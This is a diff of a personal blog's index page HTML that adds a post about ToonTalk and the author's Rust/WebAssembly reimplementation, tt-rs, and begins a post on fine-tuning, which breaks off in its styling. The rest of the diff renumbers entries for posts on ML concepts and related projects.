-      </li><li class="post-item" data-index="5"><p class="post-meta">February 20, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="11"><p class="post-meta">February 20, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">494 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: Benchmark Leakage (test data contamination), Concept vs Data Drift (changed relationships vs inputs), Weight Decay (L2 penalty for simplicity), Scaling Laws (predictable performance growth), Shadow Deployment (test alongside production).</div><h3>
           <a class="post-link" href="/2026/02/20/five-ml-concepts-17/">
             Five ML Concepts - #17
@@ -3653,7 +6611,410 @@ cargo build <span class="nt">--release</span>
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="6"><p class="post-meta">February 19, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="12"><p class="post-meta">February 20, 2026 &bull; Software Wrighter</p>
+<p class="post-reading-info"><em><span class="post-word-count">778 words</span> &bull; <span class="post-read-time">4 min read</span></em></p><h3>
+          <a class="post-link" href="/2026/02/20/tbt-toontalk-visual-programming/">
+            TBT: ToonTalk - Teaching Robots to Program
+          </a>
+        </h3><nav class="toc" data-toc-id="tbt-toontalk-visual-programming">
+  <h4>Contents</h4>
+  <ul class="toc-list"></ul>
+</nav>
+
+<style>
+/* Post content flows around floated TOC */
+.post-content {
+  overflow: hidden;
+}
+
+.toc {
+  background: #fffde7;
+  border-radius: 8px;
+  padding: 1rem 1.5rem;
+  margin: 0 1.5rem 1rem 0;
+  float: left;
+  max-width: 280px;
+}
+
+[data-theme="dark"] .toc {
+  background: #3d3a00;
+}
+
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) .toc {
+    background: #3d3a00;
+  }
+}
+
+.toc h4 {
+  margin: 0 0 0.75rem 0;
+  font-size: 1rem;
+}
+
+.toc ul {
+  margin: 0;
+  padding-left: 1.25rem;
+  list-style-type: disc;
+}
+
+.toc li {
+  margin: 0.25rem 0;
+}
+
+.toc li.toc-h3 {
+  margin-left: 1rem;
+  font-size: 0.95em;
+}
+
+.toc a {
+  text-decoration: none;
+}
+
+.toc a:hover {
+  text-decoration: underline;
+}
+
+
+@media (max-width: 600px) {
+  .toc {
+    float: none;
+    max-width: 100%;
+    margin: 0 0 1.5rem 0;
+  }
+}
+
+/* References section that floats alongside TOC */
+.references-float {
+  overflow: hidden; /* contain floated content */
+}
+
+.references-float h2 {
+  margin-top: 0;
+  font-size: 1.25rem;
+}
+
+.references-float table {
+  font-size: 0.9em;
+  width: 100%;
+}
+
+.references-float td, .references-float th {
+  padding: 0.4rem 0.6rem;
+  vertical-align: top;
+}
+
+.references-float td:first-child {
+  white-space: nowrap;
+  font-weight: bold;
+  width: 1%;
+}
+
+@media (max-width: 600px) {
+  .references-float table {
+    font-size: 0.85em;
+  }
+}
+</style>
+
+<script>
+(function() {
+  // Run after DOM is ready
+  function initTOC() {
+    document.querySelectorAll('.toc').forEach(function(toc) {
+      if (toc.dataset.initialized) return;
+      toc.dataset.initialized = 'true';
+
+      const tocList = toc.querySelector('.toc-list');
+      if (!tocList) return;
+
+      // Find the associated post-content (next sibling or parent's post-content)
+      let article = toc.nextElementSibling;
+      while (article && !article.classList.contains('post-content')) {
+        article = article.nextElementSibling;
+      }
+      // Fallback: look for .post-content in the document (single post page)
+      if (!article) {
+        article = document.querySelector('.post-content');
+      }
+
+      if (!article) {
+        toc.style.display = 'none';
+        return;
+      }
+
+      const headings = article.querySelectorAll('h2, h3');
+
+      if (headings.length < 3) {
+        toc.style.display = 'none';
+        return;
+      }
+
+      const tocId = toc.dataset.tocId || Math.random().toString(36).substr(2, 9);
+
+      headings.forEach(function(heading, index) {
+        // Add unique ID if missing
+        if (!heading.id) {
+          heading.id = 'toc-' + tocId + '-heading-' + index;
+        }
+
+        const li = document.createElement('li');
+        li.className = 'toc-' + heading.tagName.toLowerCase();
+
+        const a = document.createElement('a');
+        a.href = '#' + heading.id;
+        a.textContent = heading.textContent;
+
+        li.appendChild(a);
+        tocList.appendChild(li);
+      });
+    });
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initTOC);
+  } else {
+    initTOC();
+  }
+})();
+</script>
+<div class="post-content">
+          <p><img src="/assets/images/posts/block-robot.png" class="post-marker" alt="" /></p>
+
+<p>I first discovered ToonTalk during the Windows XP era—probably around 2003 or 2004. It was unlike anything I’d seen: a programming environment disguised as a video game where you trained robots by showing them what to do. The concept stuck with me for two decades.</p>
+
+<div class="resource-box">
+
+  <table>
+    <thead>
+      <tr>
+        <th>Resource</th>
+        <th>Link</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>tt-rs Demo</strong></td>
+        <td><a href="https://wrightmikea.github.io/tt-rs/">Live Demo</a></td>
+      </tr>
+      <tr>
+        <td><strong>tt-rs Repo</strong></td>
+        <td><a href="https://github.com/wrightmikea/tt-rs">tt-rs</a></td>
+      </tr>
+      <tr>
+        <td><strong>Explainer</strong></td>
+        <td>Coming soon</td>
+      </tr>
+    </tbody>
+  </table>
+
+</div>
+
+<h2 id="what-is-toontalk">What is ToonTalk?</h2>
+
+<p>ToonTalk is a visual programming environment created by <a href="https://toontalk.com/English/kenkahn.htm">Ken Kahn</a> in 1995. The “Toon” stands for cartoon—every abstract programming concept is mapped to a concrete, animated metaphor:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Concept</th>
+      <th>ToonTalk Metaphor</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Variables</td>
+      <td>Boxes with numbered holes</td>
+    </tr>
+    <tr>
+      <td>Values</td>
+      <td>Numbers, text, images in boxes</td>
+    </tr>
+    <tr>
+      <td>Comparison</td>
+      <td>Scales that tip when values differ</td>
+    </tr>
+    <tr>
+      <td>Functions</td>
+      <td>Robots that watch and learn</td>
+    </tr>
+    <tr>
+      <td>Message passing</td>
+      <td>Birds that carry items to nests</td>
+    </tr>
+    <tr>
+      <td>Garbage collection</td>
+      <td>Trucks that haul away unused items</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The design was influenced by games like <em>The Legend of Zelda</em> and <em>Robot Odyssey</em>—the kind of games that made you think while you played.</p>
+
+<h2 id="programming-by-demonstration">Programming by Demonstration</h2>
+
+<p>The core idea is radical: you don’t write code, you <em>show</em> a robot what to do.</p>
+
+<ol>
+  <li>Create a robot and put it in “training mode”</li>
+  <li>Perform actions while the robot watches (move items, compare values, etc.)</li>
+  <li>The robot records your actions as a program</li>
+  <li>Give the robot a box matching the training pattern—it executes the learned behavior</li>
+</ol>
+
+<p>This is programming by demonstration. The robot generalizes from your example, matching patterns and applying transformations. It’s the same conceptual model as teaching a child: “Watch what I do, then you try.”</p>
+
+<h2 id="three-generations">Three Generations</h2>
+
+<p>ToonTalk has existed in three forms:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Version</th>
+      <th>Era</th>
+      <th>Technology</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Original ToonTalk</strong></td>
+      <td>1995-2009</td>
+      <td>C++, 3D desktop application</td>
+    </tr>
+    <tr>
+      <td><strong>ToonTalk Reborn</strong></td>
+      <td>2014-2017</td>
+      <td>JavaScript/jQuery web app</td>
+    </tr>
+    <tr>
+      <td><strong>tt-rs</strong></td>
+      <td>2025-2026</td>
+      <td>Rust/WebAssembly/Yew</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The original was a full 3D world—cities, houses, helicopters, even bombs for debugging. Ken Kahn later created <a href="https://github.com/ToonTalk/ToonTalk">ToonTalk Reborn</a>, a simplified JavaScript version that runs in browsers.</p>
+
+<h2 id="why-i-built-tt-rs">Why I Built tt-rs</h2>
+
+<p>When I rediscovered ToonTalk Reborn a few years ago, I wanted to experiment with the concepts myself. But diving into a large jQuery codebase wasn’t appealing. So I did what any reasonable person would do: I vibe coded my own version in Rust.</p>
+
+<p><strong>tt-rs</strong> is a modern reimplementation using:</p>
+
+<ul>
+  <li><strong>Rust</strong> for core logic</li>
+  <li><strong>WebAssembly</strong> for browser execution</li>
+  <li><strong>Yew</strong> for reactive UI</li>
+  <li><strong>SVG/CSS</strong> for graphics and animations</li>
+</ul>
+
+<p>It’s not a port—it’s a fresh implementation inspired by the same ideas. Building it myself lets me understand the concepts deeply and experiment with variations.</p>
+
+<h2 id="current-features">Current Features</h2>
+
+<p>The <a href="https://wrightmikea.github.io/tt-rs/">live demo</a> includes:</p>
+
+<p><strong>Widgets:</strong></p>
+<ul>
+  <li><strong>Numbers</strong>: Rational arithmetic with +, -, *, / operators</li>
+  <li><strong>Boxes</strong>: Configurable containers with 0-9 holes</li>
+  <li><strong>Text</strong>: Basic text display</li>
+  <li><strong>Scales</strong>: Visual comparison that tips when values differ</li>
+  <li><strong>Robot</strong>: Training mode, action recording, basic execution</li>
+  <li><strong>Bird/Nest</strong>: Message passing (in progress)</li>
+</ul>
+
+<p><strong>Tools:</strong></p>
+<ul>
+  <li><strong>Wand</strong>: Copy any widget</li>
+  <li><strong>Vacuum</strong>: Remove widgets</li>
+</ul>
+
+<p><strong>Features:</strong></p>
+<ul>
+  <li>Drag-and-drop interaction</li>
+  <li>Contextual help panel with tutorials</li>
+  <li>Puzzle system with animated “Show Me” demos</li>
+  <li>User levels (tt1 basics, tt2 messaging)</li>
+</ul>
+
+<h2 id="whats-next">What’s Next</h2>
+
+<p>The immediate priorities for tt-rs:</p>
+
+<ol>
+  <li><strong>Bird/Nest messaging</strong> - Complete the actor-model message passing</li>
+  <li><strong>Pattern matching with erasure</strong> - Generalize patterns by removing detail</li>
+  <li><strong>Persistence</strong> - Save and load workspaces</li>
+</ol>
+
+<p>Long term, I’d like to add the 3D elements from the original—the cities, the houses, the helicopter view. But that’s a much larger project.</p>
+
+<h2 id="the-enduring-appeal">The Enduring Appeal</h2>
+
+<p>What makes ToonTalk fascinating isn’t just the visual metaphors—it’s the <em>computational model</em>. Under the hood, ToonTalk implements concurrent constraint logic programming. The robots are essentially guarded Horn clauses. The birds and nests implement the actor model.</p>
+
+<p>Heavy concepts, but you don’t need to know any of that to use it. You just train robots by example. The abstraction is complete.</p>
+
+<p>That’s why it stuck with me for twenty years. Good abstractions are rare. When you find one, it’s worth understanding deeply.</p>
+
+<div class="references-section">
+
+  <h2 id="references">References</h2>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Resource</th>
+        <th>Link</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>ToonTalk Website</strong></td>
+        <td><a href="https://www.toontalk.com/">toontalk.com</a></td>
+      </tr>
+      <tr>
+        <td><strong>ToonTalk on Wikipedia</strong></td>
+        <td><a href="https://en.wikipedia.org/wiki/ToonTalk">Wikipedia</a></td>
+      </tr>
+      <tr>
+        <td><strong>ToonTalk Reborn (JS)</strong></td>
+        <td><a href="https://github.com/ToonTalk/ToonTalk">github.com/ToonTalk/ToonTalk</a></td>
+      </tr>
+      <tr>
+        <td><strong>ToonTalk Reborn Demo</strong></td>
+        <td><a href="https://toontalk.github.io/ToonTalk/">toontalk.github.io/ToonTalk</a></td>
+      </tr>
+      <tr>
+        <td><strong>ToonTalk Reborn Wiki</strong></td>
+        <td><a href="https://github.com/ToonTalk/ToonTalk/wiki">Wiki</a></td>
+      </tr>
+      <tr>
+        <td><strong>Ken Kahn’s Page</strong></td>
+        <td><a href="https://toontalk.com/English/kenkahn.htm">Ken Kahn</a></td>
+      </tr>
+      <tr>
+        <td><strong>Original Paper (1995)</strong></td>
+        <td><a href="https://eric.ed.gov/?id=ED392435">ERIC - ToonTalk: An Animated Programming Environment</a></td>
+      </tr>
+      <tr>
+        <td><strong>Ken Kahn’s Research</strong></td>
+        <td><a href="https://www.academia.edu/2795458/ToonTalk_and_Logo">Academia.edu</a></td>
+      </tr>
+    </tbody>
+  </table>
+
+</div>
+
+<hr />
+
+<p><em>Some ideas are worth rediscovering. ToonTalk is one of them.</em></p>
+
+
+          </div><img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
+      </li><li class="post-item" data-index="13"><p class="post-meta">February 19, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">1080 words</span> &bull; <span class="post-read-time">6 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">ToonTalk is a 1995 visual programming environment where you train robots by showing them what to do. I vibe coded tt-rs, a Rust/WebAssembly reimplementation with boxes, scales, birds, nests, and robots---programming by demonstration for the browser.</div><h3>
           <a class="post-link" href="/2026/02/19/tbt-toontalk-visual-programming/">
             TBT (4/?): ToonTalk - Teaching Robots to Program
@@ -4256,7 +7617,7 @@ cargo build <span class="nt">--release</span>
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="7"><p class="post-meta">February 19, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="14"><p class="post-meta">February 19, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">490 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: Train/Val/Test Split (separate data roles), Overconfidence (high probability wrong predictions), Batch Normalization (stable training), Optimization vs Generalization (low train loss doesn't mean good test), A/B Testing (compare with experiments).</div><h3>
           <a class="post-link" href="/2026/02/19/five-ml-concepts-16/">
             Five ML Concepts - #16
@@ -4717,7 +8078,7 @@ cargo build <span class="nt">--release</span>
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="8"><p class="post-meta">February 18, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="15"><p class="post-meta">February 18, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">809 words</span> &bull; <span class="post-read-time">5 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">RSFT on easy examples made performance worse---27% vs 37% SFT baseline. Training distribution must match evaluation distribution. Easy examples teach shortcuts that fail on hard problems. The fix is one flag change.</div><h3>
           <a class="post-link" href="/2026/02/18/multi-hop-reasoning-distribution-trap/">
             Multi-Hop Reasoning (2/2): The Distribution Trap
@@ -5218,7 +8579,7 @@ ANSWER: B
 
 
           </div><img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="9"><p class="post-meta">February 18, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="16"><p class="post-meta">February 18, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">788 words</span> &bull; <span class="post-read-time">4 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Part 2 of implementing the Share algorithm: after fixing critical bugs (zero-gradient saddle point, half-parameter training), routing-based coefficient selection achieves zero regressions. Result handling improved 40% to 50%. We're 60% through verifying the paper's claims.</div><h3>
           <a class="post-link" href="/2026/02/18/sleepy-coder-routing-prevents-forgetting/">
             Towards Continuous LLM Learning (2): Routing Prevents Forgetting
@@ -5664,7 +9025,7 @@ Eval:  Route to appropriate coefficients
 
 
           </div><img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="10"><p class="post-meta">February 18, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="17"><p class="post-meta">February 18, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">492 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: Perplexity (how surprised by data), Catastrophic Forgetting (new learning erases old), Weight Initialization (starting values matter), Curse of Dimensionality (high-D makes data sparse), Monitoring (track performance and drift).</div><h3>
           <a class="post-link" href="/2026/02/18/five-ml-concepts-15/">
             Five ML Concepts - #15
@@ -6125,7 +9486,7 @@ Eval:  Route to appropriate coefficients
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="11"><p class="post-meta">February 17, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="18"><p class="post-meta">February 17, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">460 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: ROC/AUC (performance across thresholds), Spurious Correlations (coincidental patterns), Gradient Clipping (limit gradients for stability), Loss Landscapes (error surface over parameters), Cold Start (no history for new users).</div><h3>
           <a class="post-link" href="/2026/02/17/five-ml-concepts-14/">
             Five ML Concepts - #14
@@ -6578,7 +9939,7 @@ Eval:  Route to appropriate coefficients
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="12"><p class="post-meta">February 16, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="19"><p class="post-meta">February 16, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">470 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: Calibration (predicted probabilities match outcomes), Shortcut Learning (exploiting spurious patterns), Early Stopping (halt when validation plateaus), Universal Approximation (NNs can fit any function), Checkpointing (save model state).</div><h3>
           <a class="post-link" href="/2026/02/16/five-ml-concepts-13/">
             Five ML Concepts - #13
@@ -7038,7 +10399,7 @@ Eval:  Route to appropriate coefficients
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="13"><p class="post-meta">February 15, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="20"><p class="post-meta">February 15, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">510 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: Precision vs Recall (correct positives vs finding all), OOD Inputs (data unlike training), Batch Size (examples per update), Inductive Bias (built-in assumptions), Latency vs Throughput (speed vs capacity).</div><h3>
           <a class="post-link" href="/2026/02/15/five-ml-concepts-12/">
             Five ML Concepts - #12
@@ -7498,7 +10859,7 @@ Eval:  Route to appropriate coefficients
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="14"><p class="post-meta">February 14, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="21"><p class="post-meta">February 14, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">1048 words</span> &bull; <span class="post-read-time">6 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Personal Software for education: a neural network platform where every step is visible---no framework magic. CLI with progress bars, web UI with real-time loss charts, WASM for browser execution. Built via Vibe Coding to watch XOR training reveal why hidden layers matter.</div><h3>
           <a class="post-link" href="/2026/02/14/neural-net-rs-educational-ml-platform/">
             Neural-Net-RS: An Educational Neural Network Platform
@@ -8105,7 +11466,7 @@ neural-net-cli serve <span class="nt">--port</span> 8080
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="15"><p class="post-meta">February 14, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="22"><p class="post-meta">February 14, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">914 words</span> &bull; <span class="post-read-time">5 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Personal Software via Vibe Coding: I needed to find cat photos scattered across my system. Instead of cloud services or app stores, I described what I wanted to Claude Code and got a working Rust CLI tool using YOLOv8 and ONNX Runtime. Privacy-first, locally-run, and mine to modify.</div><h3>
           <a class="post-link" href="/2026/02/14/cat-finder-local-ml-rust/">
             Cat Finder: Personal Software via Vibe Coding
@@ -8647,7 +12008,7 @@ cat-finder ~/Photos | xargs <span class="nt">-I</span> <span class="o">{}</span>
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="16"><p class="post-meta">February 14, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="23"><p class="post-meta">February 14, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">525 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: RNN (sequential processing with memory), Chain of Thought (step-by-step reasoning), Softmax (scores to probabilities), MoE (route inputs to specialists), Distribution Shift (training vs deployment mismatch).</div><h3>
           <a class="post-link" href="/2026/02/14/five-ml-concepts-11/">
             Five ML Concepts - #11
@@ -9111,7 +12472,7 @@ cat-finder ~/Photos | xargs <span class="nt">-I</span> <span class="o">{}</span>
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="17"><p class="post-meta">February 13, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="24"><p class="post-meta">February 13, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">995 words</span> &bull; <span class="post-read-time">5 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">When data won't fit in a context window, RLM expands the workspace instead. The MIT paper achieves 87-91% accuracy where standard prompting scores 0%. My Rust implementation provides four capability levels from DSL commands to WASM sandboxing to LLM delegation.</div><h3>
           <a class="post-link" href="/2026/02/13/rlm-recursive-language-models/">
             RLM: Recursive Language Models for Massive Context
@@ -9710,7 +13071,7 @@ open http://localhost:8080/visualize
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="18"><p class="post-meta">February 13, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="25"><p class="post-meta">February 13, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">521 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: CNN (sliding filters for image features), Encoder-Decoder (compress then generate), RAG (retrieve context before generating), Few-shot Learning (learn from prompt examples), Distillation (small student mimics large teacher).</div><h3>
           <a class="post-link" href="/2026/02/13/five-ml-concepts-10/">
             Five ML Concepts - #10
@@ -10174,7 +13535,7 @@ open http://localhost:8080/visualize
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="19"><p class="post-meta">February 12, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="26"><p class="post-meta">February 12, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">1655 words</span> &bull; <span class="post-read-time">9 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Before pixels, there were vectors. Vibe Coding classic arcade games (Asteroids, BattleZone, Tempest) in Rust/WebAssembly with wgpu rendering---from my first encounter with an IBM 2250 to playable browser demos, all built in one day with Claude Code.</div><h3>
           <a class="post-link" href="/2026/02/12/tbt-vector-graphics-games/">
             TBT (3/?): Vector Graphics Games
@@ -10933,7 +14294,7 @@ vectorcade-web-yew/     (Yew web shell)
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="20"><p class="post-meta">February 12, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="27"><p class="post-meta">February 12, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">781 words</span> &bull; <span class="post-read-time">4 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">When multiple AI agents work together, fixed communication patterns fail at scale. DyTopo rebuilds the graph each round based on semantic similarity between what agents need and what they can offer, preventing context explosion while enabling adaptive collaboration.</div><h3>
           <a class="post-link" href="/2026/02/12/dytopo-rs-dynamic-topology-multi-agent/">
             DyTopo: Dynamic Topology for Multi-Agent AI
@@ -11528,7 +14889,7 @@ vectorcade-web-yew/     (Yew web shell)
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="21"><p class="post-meta">February 12, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="28"><p class="post-meta">February 12, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">1224 words</span> &bull; <span class="post-read-time">7 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">What happens when you fine-tune a model on new tasks? It forgets old ones. This post documents our implementation of the Share algorithm in Rust—using SVD-based subspace extraction to enable continual learning without catastrophic forgetting. Part 1 covers the problem and initial negative results.</div><h3>
           <a class="post-link" href="/2026/02/12/sleepy-coder-when-fine-tuning-fails/">
             Towards Continuous LLM Learning (1): Sleepy Coder - When Fine-Tuning Fails
@@ -12202,7 +15563,7 @@ Conclusion:             Target not achievable with LoRA
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="22"><p class="post-meta">February 12, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="29"><p class="post-meta">February 12, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">492 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: Dropout (random disabling prevents overfitting), RLHF (learn from human preferences), Inference (using trained models), Quantization (lower precision for efficiency), Flash Attention (block-wise for memory savings).</div><h3>
           <a class="post-link" href="/2026/02/12/five-ml-concepts-9/">
             Five ML Concepts - #9
@@ -12666,7 +16027,534 @@ Conclusion:             Target not achievable with LoRA
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="23"><p class="post-meta">February 11, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="30"><p class="post-meta">February 12, 2026 &bull; Software Wrighter</p>
+<p class="post-reading-info"><em><span class="post-word-count">1114 words</span> &bull; <span class="post-read-time">6 min read</span></em></p><h3>
+          <a class="post-link" href="/2026/02/12/sleepy-coder-when-fine-tuning-fails/">
+            Sleepy Coder: When Fine-Tuning Fails
+          </a>
+        </h3><nav class="toc" data-toc-id="sleepy-coder-when-fine-tuning-fails">
+  <h4>Contents</h4>
+  <ul class="toc-list"></ul>
+</nav>
+
+<style>
+/* Post content flows around floated TOC */
+.post-content {
+  overflow: hidden;
+}
+
+.toc {
+  background: #fffde7;
+  border-radius: 8px;
+  padding: 1rem 1.5rem;
+  margin: 0 1.5rem 1rem 0;
+  float: left;
+  max-width: 280px;
+}
+
+[data-theme="dark"] .toc {
+  background: #3d3a00;
+}
+
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) .toc {
+    background: #3d3a00;
+  }
+}
+
+.toc h4 {
+  margin: 0 0 0.75rem 0;
+  font-size: 1rem;
+}
+
+.toc ul {
+  margin: 0;
+  padding-left: 1.25rem;
+  list-style-type: disc;
+}
+
+.toc li {
+  margin: 0.25rem 0;
+}
+
+.toc li.toc-h3 {
+  margin-left: 1rem;
+  font-size: 0.95em;
+}
+
+.toc a {
+  text-decoration: none;
+}
+
+.toc a:hover {
+  text-decoration: underline;
+}
+
+
+@media (max-width: 600px) {
+  .toc {
+    float: none;
+    max-width: 100%;
+    margin: 0 0 1.5rem 0;
+  }
+}
+
+/* References section that floats alongside TOC */
+.references-float {
+  overflow: hidden; /* contain floated content */
+}
+
+.references-float h2 {
+  margin-top: 0;
+  font-size: 1.25rem;
+}
+
+.references-float table {
+  font-size: 0.9em;
+  width: 100%;
+}
+
+.references-float td, .references-float th {
+  padding: 0.4rem 0.6rem;
+  vertical-align: top;
+}
+
+.references-float td:first-child {
